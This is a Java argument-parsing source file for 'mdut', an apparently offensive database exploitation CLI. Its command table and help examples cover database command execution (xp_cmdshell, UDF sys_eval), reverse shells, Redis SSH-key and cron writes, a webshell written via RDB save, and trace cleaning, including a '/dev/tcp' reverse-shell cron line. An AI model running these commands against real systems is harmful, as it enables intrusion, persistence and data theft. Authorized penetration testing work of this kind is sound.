package cli;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
import java.util.LinkedHashMap;
import java.util.LinkedHashSet;
import java.util.List;
import java.util.Map;
import java.util.Set;

/**
 * 表驱动命令面（docs/3 §2 = 本表的对外投影；help 由此生成，单一事实源）。
 *
 * 解析规则：
 *  - 首个非 flag token = 子命令（含别名归一）；其余非 flag token = 位置参数；
 *  - flag 形如 --name value / --name=value / -c value；布尔 flag 见 BOOLEAN_FLAGS；
 *  - 未知 flag / 缺值 / 未知命令 → UsageException（exit 2）；
 *  - 无子命令但带 --sql + --id + 尾随 SQL → 兼容形式等价 `sql --id <id> "<sql>"`（docs/3 §1.1）。
 * 参数级校验（required/个数）在 CliMain 分发前统一做。
 */
public final class Args {

    private Args() {
    }

    // ---------------- 元模型 ----------------

    public static class Opt {
        public final String flag;        // 不含 -- 前缀
        public final boolean required;
        public final boolean takesValue;
        public final String def;
        public final String desc;

        public Opt(String flag, boolean required, boolean takesValue, String def, String desc) {
            this.flag = flag;
            this.required = required;
            this.takesValue = takesValue;
            this.def = def;
            this.desc = desc;
        }

        static Opt req(String flag, String desc) {
            return new Opt(flag, true, true, null, desc);
        }

        static Opt val(String flag, String def, String desc) {
            return new Opt(flag, false, true, def, desc);
        }

        static Opt bool(String flag, String desc) {
            return new Opt(flag, false, false, null, desc);
        }
    }

    public static class Pos {
        public final String name;
        public final boolean required;
        public final String desc;

        public Pos(String name, boolean required, String desc) {
            this.name = name;
            this.required = required;
            this.desc = desc;
        }
    }

    public static class Spec {
        public final String name;
        public final String[] aliases;
        public final String usage;
        public final String summary;
        public final Opt[] opts;
        public final Pos[] pos;
        public final String[] examples;
        public final boolean mutating;   // 持 task 写锁（docs/3 §5）

        public Spec(String name, String[] aliases, String usage, String summary,
                    Opt[] opts, Pos[] pos, String[] examples, boolean mutating) {
            this.name = name;
            this.aliases = aliases;
            this.usage = usage;
            this.summary = summary;
            this.opts = opts;
            this.pos = pos;
            this.examples = examples;
            this.mutating = mutating;
        }
    }

    /** 全局布尔 flag（出现即 true，不吃值） */
    public static final Set<String> BOOLEAN_FLAGS = Collections.unmodifiableSet(
            new LinkedHashSet<>(Arrays.asList("stdin", "oracle-service", "sql", "help", "version")));

    // ---------------- 命令表 ----------------

    private static final String GLOBAL_FLAGS_DESC =
            "--task NAME 任务隔离 | --format json|text | --timeout SEC(默认5) | --proxy socks5://[user:pass@]h:p | -c ENC 回显编码";

    static final Spec[] SPECS = {
            new Spec("add", new String[]{},
                    "add <type> --host H [--port P] [--user U] [--pass P] [--db D] [--memo M] [--group G] [--oracle-service] [--enc ENC]",
                    "登记连接并做一次连通测试（失败→exit 3，记录不保留）",
                    new Opt[]{
                            Opt.req("host", "目标主机"),
                            Opt.val("port", defPort(), "端口（按 type 缺省）"),
                            Opt.val("user", "", "用户名（按 type 缺省）"),
                            Opt.val("pass", "", "密码"),
                            Opt.val("db", "", "库名/SID/服务名（按 type 缺省）"),
                            Opt.val("memo", "", "备注"),
                            Opt.val("group", "", "分组名"),
                            Opt.val("enc", "", "连接级回显编码"),
                            Opt.bool("oracle-service", "Oracle 使用服务名模式（缺省 SID）"),
                    },
                    new Pos[]{new Pos("type", true, "mysql|mssql|postgresql|oracle|redis|mongodb（别名 sqlserver/postgres/pg/mongo）")},
                    new String[]{
                            "mdut --task eng1 add mysql --host 10.0.0.1 --port 3306 --user root --pass '123456' --db mysql",
                            "mdut add redis --host 127.0.0.1 --port 6379 --pass 'mirrorstrike'",
                            "mdut add oracle --host 10.0.0.2 --oracle-service --db ORCLPDB1"
                    }, false),
            new Spec("list", new String[]{"ls"},
                    "list [--group G]",
                    "列出当前 task 的连接（data.conns 结构化数组）",
                    new Opt[]{Opt.val("group", "", "按分组过滤")},
                    new Pos[]{},
                    new String[]{"mdut --task eng1 list", "mdut list --group web"}, false),
            new Spec("delete", new String[]{"rm-conn"},
                    "delete <id>",
                    "删除一条连接记录",
                    new Opt[]{},
                    new Pos[]{new Pos("id", true, "连接 ID（task 内唯一）")},
                    new String[]{"mdut --task eng1 delete 3"}, false),
            new Spec("add-group", new String[]{},
                    "add-group <name>",
                    "新建分组",
                    new Opt[]{},
                    new Pos[]{new Pos("name", true, "分组名")},
                    new String[]{"mdut add-group web"}, false),
            new Spec("delete-group", new String[]{},
                    "delete-group <name>",
                    "删除分组（连接记录保留）",
                    new Opt[]{},
                    new Pos[]{new Pos("name", true, "分组名")},
                    new String[]{"mdut delete-group web"}, false),

            new Spec("info", new String[]{},
                    "info --id <id>",
                    "基本信息探测（版本/平台/利用条件；redis 附带 CVE 扫描[M3a]）",
                    new Opt[]{Opt.req("id", "连接 ID")},
                    new Pos[]{},
                    new String[]{"mdut --task eng1 info --id 3"}, false),
            new Spec("exec", new String[]{},
                    "exec --id <id> [--method M] [--vps-host H --vps-port P] <cmd>",
                    "命令执行（mysql=UDF sys_eval 自动部署链；mssql --method xpcmdshell|oap|agent|clr|potato系[M3a]；pg 自动选路；oracle --method java|scheduler；redis=system.exec 需模块）",
                    new Opt[]{
                            Opt.req("id", "连接 ID"),
                            Opt.val("method", "", "执行方法（随库枚举）"),
                            Opt.val("vps-host", "", "redis 主从 rogue 外部进程地址"),
                            Opt.val("vps-port", "", "redis 主从 rogue 外部进程端口"),
                    },
                    new Pos[]{new Pos("cmd", true, "shell 命令原文（CLI 负责包装，勿手写 SELECT sys_eval）")},
                    new String[]{
                            "mdut --task eng1 exec --id 3 'id'",
                            "mdut exec --id 4 --method xpcmdshell 'whoami'",
                            "mdut exec --id 6 --vps-host 10.0.0.99 --vps-port 21000 'id'"
                    }, true),
            new Spec("sql", new String[]{},
                    "sql --id <id> \"<sql>\"（兼容形式：--sql --id <id> \"<sql>\"）",
                    "原生 SQL 直通（mysql/mssql/postgresql/oracle）",
                    new Opt[]{Opt.req("id", "连接 ID")},
                    new Pos[]{new Pos("sql", true, "SQL 文本")},
                    new String[]{
                            "mdut --task eng1 sql --id 3 \"select version()\"",
                            "mdut --task eng1 --sql --id 3 \"select LOAD_FILE('/etc/hostname')\""
                    }, false),
            new Spec("clean", new String[]{},
                    "clean --id <id>",
                    "清痕（各库语义见 docs/3 §3.4；部署了什么卸什么）",
                    new Opt[]{Opt.req("id", "连接 ID")},
                    new Pos[]{},
                    new String[]{"mdut --task eng1 clean --id 3"}, true),
            new Spec("revshell", new String[]{},
                    "revshell --id <id> <ip> <port>",
                    "反弹 Shell（mysql=uwx DLL；pg=sys_eval 包装[M3a]；oracle=connectback；redis=system.rev 需模块）",
                    new Opt[]{Opt.req("id", "连接 ID")},
                    new Pos[]{new Pos("ip", true, "回连 IP"), new Pos("port", true, "回连端口")},
                    new String[]{"mdut --task eng1 revshell --id 3 10.0.0.99 4444"}, true),

            new Spec("list-files", new String[]{"lsf"},
                    "list-files --id <id> <path>",
                    "目录列举（mssql=xp_dirtree/oracle=filerun [M2]；mysql=sys_eval/pg=pg_ls_dir/redis=system.exec [M3a]）",
                    new Opt[]{Opt.req("id", "连接 ID")},
                    new Pos[]{new Pos("path", true, "远端目录")},
                    new String[]{"mdut --task eng1 list-files --id 4 'C:\\\\inetpub\\\\'" }, true),
            new Spec("read", new String[]{},
                    "read --id <id> <file>",
                    "读取远端文件（小内容 base64 进 data.b64；大文件请用 download --out）",
                    new Opt[]{Opt.req("id", "连接 ID")},
                    new Pos[]{new Pos("file", true, "远端文件路径")},
                    new String[]{"mdut --task eng1 read --id 4 'C:\\\\inetpub\\\\wwwroot\\\\web.config'"}, false),
            new Spec("write", new String[]{},
                    "write --id <id> <file> [content | --stdin]",
                    "写远端文件（内容经 hex 管道；--stdin 从标准输入读）",
                    new Opt[]{Opt.req("id", "连接 ID"), Opt.bool("stdin", "内容从 stdin 读入")},
                    new Pos[]{new Pos("file", true, "远端文件路径"), new Pos("content", false, "写入内容（缺省时必须 --stdin）")},
                    new String[]{"echo test | mdut write --id 4 'C:\\\\a.txt' --stdin"}, true),
            new Spec("upload", new String[]{},
                    "upload --id <id> <local> <remote>",
                    "上传本地文件（直读直传，内容不进上下文）",
                    new Opt[]{Opt.req("id", "连接 ID")},
                    new Pos[]{new Pos("local", true, "本地文件"), new Pos("remote", true, "远端目标路径（含文件名）")},
                    new String[]{"mdut --task eng1 upload --id 4 ./tool.exe 'C:\\\\Users\\\\Public\\\\tool.exe'"}, true),
            new Spec("download", new String[]{"dl"},
                    "download --id <id> <remote> [--out <local>]",
                    "下载远端文件（--out 直存本地，信封只报字节数；缺省内容进信封，仅限小文件）",
                    new Opt[]{Opt.req("id", "连接 ID"), Opt.val("out", "", "本地保存路径")},
                    new Pos[]{new Pos("remote", true, "远端文件路径")},
                    new String[]{"mdut --task eng1 download --id 4 'C:\\\\\\\\secret.zip' --out ./secret.zip"}, false),
            new Spec("rm", new String[]{},
                    "rm --id <id> <path>",
                    "删除远端文件（docs/3 §2 冻结：文件删除定名 rm，delete 保留给连接记录）",
                    new Opt[]{Opt.req("id", "连接 ID")},
                    new Pos[]{new Pos("path", true, "远端文件路径")},
                    new String[]{"mdut --task eng1 rm --id 4 'C:\\\\\\\\a.txt'"}, true),
            new Spec("mkdir", new String[]{},
                    "mkdir --id <id> <path>",
                    "创建远端目录（oracle 无此能力→hint）",
                    new Opt[]{Opt.req("id", "连接 ID")},
                    new Pos[]{new Pos("path", true, "远端目录")},
                    new String[]{"mdut --task eng1 mkdir --id 4 'C:\\\\\\\\temp'"}, true),

            new Spec("recovery", new String[]{},
                    "recovery --id <id>",
                    "mssql 一键恢复组件（xp_cmdshell/OAP/CLR 全恢复；M3a 扩 potato 卸载）",
                    new Opt[]{Opt.req("id", "连接 ID")},
                    new Pos[]{},
                    new String[]{"mdut --task eng1 recovery --id 4"}, true),
            new Spec("deploy", new String[]{},
                    "deploy --id <id> [--component clr]",
                    "mssql CLR 全链部署（trustworthy→activate→init→create func；potato 系组件随 exec --method 自动部署[M3a]）",
                    new Opt[]{Opt.req("id", "连接 ID"), Opt.val("component", "clr", "组件名")},
                    new Pos[]{},
                    new String[]{"mdut --task eng1 deploy --id 4"}, true),
            new Spec("crontab", new String[]{},
                    "crontab --id <id> [--path P]",
                    "redis 写计划任务（⚠️ 变异操作；docker 可弃容器或授权目标）",
                    new Opt[]{Opt.req("id", "连接 ID"), Opt.val("path", "", "cron 目录（缺省自动枚举）")},
                    new Pos[]{new Pos("cron-line", true, "完整 cron 行（含回连命令；显式传入不内置默认文本）")},
                    new String[]{"mdut crontab --id 1 '*/1 * * * * /bin/sh -i >& /dev/tcp/IP/PORT 0>&1'"}, true),
            new Spec("sshkey", new String[]{},
                    "sshkey --id <id> --pubkey K [--path P]",
                    "redis 写 SSH 公钥（⚠️ 变异操作）",
                    new Opt[]{Opt.req("id", "连接 ID"), Opt.req("pubkey", "公钥原文（ssh-rsa AAAA...）"), Opt.val("path", "/root/.ssh/", "目标 .ssh 目录")},
                    new Pos[]{},
                    new String[]{"mdut sshkey --id 1 --pubkey 'ssh-rsa AAAA... user@host'"}, true),
            new Spec("rdb", new String[]{},
                    "rdb --id <id> --dir D --file F",
                    "redis 设置持久化路径并 SAVE（RDB 写文件原语）",
                    new Opt[]{Opt.req("id", "连接 ID"), Opt.req("dir", "持久化目录"), Opt.req("file", "持久化文件名")},
                    new Pos[]{},
                    new String[]{"mdut rdb --id 1 --dir /var/www/html --file shell.php"}, true),

            new Spec("task", new String[]{},
                    "task <list|path>",
                    "任务管理：list=枚举任务；path=当前 task 目录",
                    new Opt[]{},
                    new Pos[]{new Pos("sub", true, "list|path")},
                    new String[]{"mdut task list", "mdut task path"}, false),
            new Spec("doctor", new String[]{},
                    "doctor",
                    "自检：java/jar目录/驱动/Plugins/task库健康/代理连通（docs/3 §4）",
                    new Opt[]{},
                    new Pos[]{},
                    new String[]{"mdut doctor", "mdut --proxy socks5://127.0.0.1:1080 doctor"}, false),
            new Spec("version", new String[]{},
                    "version",
                    "版本与构建信息",
                    new Opt[]{},
                    new Pos[]{},
                    new String[]{"mdut version"}, false),
            new Spec("help", new String[]{},
                    "help [command]",
                    "帮助：无参=命令总览；带命令=参数级文档",
                    new Opt[]{},
                    new Pos[]{new Pos("command", false, "命令名")},
                    new String[]{"mdut --help", "mdut help exec"}, false),
    };

    // ---------------- 解析 ----------------

    public static class UsageException extends Exception {
        public final String error;
        public final String hint;

        public UsageException(String error, String hint) {
            super(error);
            this.error = error;
            this.hint = hint;
        }
    }

    public static class Parsed {
        public String command;                       // 归一后的命令名
        public final Map<String, String> flags = new LinkedHashMap<>();
        public final List<String> positionals = new ArrayList<>();
    }

    public static Spec findSpec(String name) {
        if (name == null) {
            return null;
        }
        for (Spec s : SPECS) {
            if (s.name.equals(name)) {
                return s;
            }
            for (String a : s.aliases) {
                if (a.equals(name)) {
                    return s;
                }
            }
        }
        return null;
    }

    /**
     * @param argv 原始 argv（不含 JVM 参数）
     */
    public static Parsed parse(String[] argv) throws UsageException {
        Parsed p = new Parsed();
        List<String> tokens = new ArrayList<>(Arrays.asList(argv));
        while (!tokens.isEmpty()) {
            String t = tokens.remove(0);
            if (t.startsWith("-") && t.length() > 1 && !isDashValue(t)) {
                String name;
                String inlineVal = null;
                int eq = t.indexOf('=');
                if (eq > 0) {
                    name = t.substring(t.startsWith("--") ? 2 : 1, eq);
                    inlineVal = t.substring(eq + 1);
                } else {
                    name = t.startsWith("--") ? t.substring(2) : t.substring(1);
                }
                if (name.isEmpty()) {
                    throw new UsageException("空参数名: " + t, "见 mdut --help");
                }
                if (BOOLEAN_FLAGS.contains(name)) {
                    if (inlineVal != null) {
                        p.flags.put(name, inlineVal);
                    } else {
                        p.flags.put(name, "true");
                    }
                    continue;
                }
                String value;
                if (inlineVal != null) {
                    value = inlineVal;
                } else {
                    if (tokens.isEmpty()) {
                        throw new UsageException("参数 --" + name + " 缺少值", "用法见 mdut help <command>");
                    }
                    value = tokens.remove(0);
                }
                p.flags.put(name, value);
            } else {
                if (p.command == null) {
                    String norm = normalizeCommand(t);
                    if (findSpec(norm) != null) {
                        p.command = norm;
                    } else if (p.flags.containsKey("sql") && p.flags.containsKey("id")) {
                        // 兼容形式（docs/3 §1.1）：--sql --id N "<sql>" → sql --id N "<sql>"
                        p.command = "sql";
                        p.positionals.add(t);
                    } else {
                        throw new UsageException("未知命令: " + t, "mdut --help 查看命令清单");
                    }
                } else {
                    p.positionals.add(t);
                }
            }
        }
        // 兼容形式兜底：--sql + --id 但 SQL 文本未随 token 出现（如 --sql="..." 内联）→ 仍归 sql 命令
        if (p.command == null && p.flags.containsKey("sql") && p.flags.containsKey("id")) {
            p.command = "sql";
        }
        // --sql="select ..." 内联形式：sql 是布尔旗标，内联值需转为 SQL 位置参数（否则丢失误导报错）
        if ("sql".equals(p.command) && p.positionals.isEmpty()) {
            String inline = p.flags.get("sql");
            if (inline != null && !"true".equals(inline)) {
                p.positionals.add(inline);
            }
        }
        return p;
    }

    private static boolean isDashValue(String token) {
        // 允许负数当位置值（如 revshell 端口场景几乎不会；保护 --host -abc 误判不做）
        return token.matches("-\\d+(\\.\\d+)?");
    }

    private static String normalizeCommand(String t) {
        if ("sqlserver".equals(t)) {
            return "mssql";
        }
        if ("postgres".equals(t) || "pg".equals(t)) {
            return "postgresql";
        }
        if ("mongo".equals(t)) {
            return "mongodb";
        }
        return t;
    }

    /** add 的 port 缺省提示（真实按 type 缺省在 CliMain/types 里） */
    private static String defPort() {
        return "";
    }

    // ---------------- help 生成 ----------------

    public static String helpAll() {
        StringBuilder sb = new StringBuilder(2048);
        sb.append("mdut — Multiple Database Utilization Tools (CLI)  ").append(CliMain.VERSION).append("\n");
        sb.append("用法: mdut [全局选项] <command> [args...]\n");
        sb.append("全局: ").append(GLOBAL_FLAGS_DESC).append("\n\n");
        sb.append("命令:\n");
        int w = 0;
        for (Spec s : SPECS) {
            w = Math.max(w, s.name.length());
        }
        for (Spec s : SPECS) {
            sb.append(String.format("  %-" + w + "s  %s%n", s.name, s.summary));
        }
        sb.append("\n退出码: 0 成功 / 2 用法错误 / 3 目标失败 / 4 超时 / 5 写锁竞争\n");
        sb.append("参数级文档: mdut help <command>\n");
        sb.append("\n").append(DISCLAIMER);
        return sb.toString();
    }

    public static String helpCommand(String name) {
        Spec s = findSpec(name);
        if (s == null) {
            return null;
        }
        StringBuilder sb = new StringBuilder(1024);
        sb.append(s.name).append(" — ").append(s.summary).append("\n");
        sb.append("用法: mdut [全局选项] ").append(s.usage).append("\n");
        if (s.opts.length > 0) {
            sb.append("\n选项:\n");
            for (Opt o : s.opts) {
                sb.append("  --").append(String.format("%-16s", o.flag));
                sb.append(o.required ? "必填 " : "     ");
                sb.append(o.takesValue ? (o.def != null && !o.def.isEmpty() ? "值(缺省 " + o.def + ") " : "值 ") : "开关 ");
                sb.append(o.desc).append("\n");
            }
        }
        if (s.pos.length > 0) {
            sb.append("\n位置参数:\n");
            for (Pos ps : s.pos) {
                sb.append("  ").append(String.format("%-16s", ps.name));
                sb.append(ps.required ? "必填 " : "可选 ");
                sb.append(ps.desc).append("\n");
            }
        }
        if (s.examples.length > 0) {
            sb.append("\n示例:\n");
            for (String e : s.examples) {
                sb.append("  ").append(e).append("\n");
            }
        }
        sb.append("\n").append(DISCLAIMER);
        return sb.toString();
    }

    public static final String DISCLAIMER =
            "免责声明: 本工具仅面向授权安全测试与安全研究。对未授权目标使用数据库利用/提权/文件操作能力属违法行为，使用者承担全部责任。";

    /** 全局 flag 白名单（validate 用；命令级 flag 以 spec.opts 为准） */
    private static final Set<String> GLOBAL_FLAGS = Collections.unmodifiableSet(new LinkedHashSet<>(
            Arrays.asList("task", "format", "timeout", "proxy", "c", "enc", "help", "version", "sql")));

    /**
     * 校验必填 flag/位置参数 + 未知 flag 拒判（在命令分发前调用）
     */
    public static void validate(Spec s, Parsed p) throws UsageException {
        // 未知 flag 拒判（拼错参数必须报出来，而不是静默丢弃成缺省值）
        Set<String> allowed = new LinkedHashSet<>(GLOBAL_FLAGS);
        allowed.addAll(BOOLEAN_FLAGS);
        for (Opt o : s.opts) {
            allowed.add(o.flag);
        }
        for (String f : p.flags.keySet()) {
            if (!allowed.contains(f)) {
                throw new UsageException("未知参数: --" + f,
                        "mdut " + s.name + " 可用参数见 mdut help " + s.name);
            }
        }
        for (Opt o : s.opts) {
            if (o.required && !p.flags.containsKey(o.flag)) {
                throw new UsageException("缺少必填参数 --" + o.flag,
                        "用法: mdut " + s.usage + "（或 mdut help " + s.name + "）");
            }
            if (!o.takesValue && !p.flags.containsKey(o.flag) && o.def != null) {
                p.flags.put(o.flag, o.def);
            }
            if (o.takesValue && !p.flags.containsKey(o.flag) && o.def != null && !o.def.isEmpty()) {
                p.flags.put(o.flag, o.def);
            }
        }
        int requiredPos = 0;
        for (Pos ps : s.pos) {
            if (ps.required) {
                requiredPos++;
            }
        }
        if (p.positionals.size() < requiredPos) {
            throw new UsageException("缺少必填位置参数: " + s.pos[Math.min(p.positionals.size(), s.pos.length - 1)].name,
                    "用法: mdut " + s.usage);
        }
        if (p.positionals.size() > s.pos.length) {
            throw new UsageException("多余的位置参数: " + p.positionals.get(s.pos.length),
                    "用法: mdut " + s.usage);
        }
        // 布尔 flag 缺省补 false，方便取值
        for (Opt o : s.opts) {
            if (!o.takesValue && !p.flags.containsKey(o.flag)) {
                p.flags.put(o.flag, "false");
            }
        }
    }
}
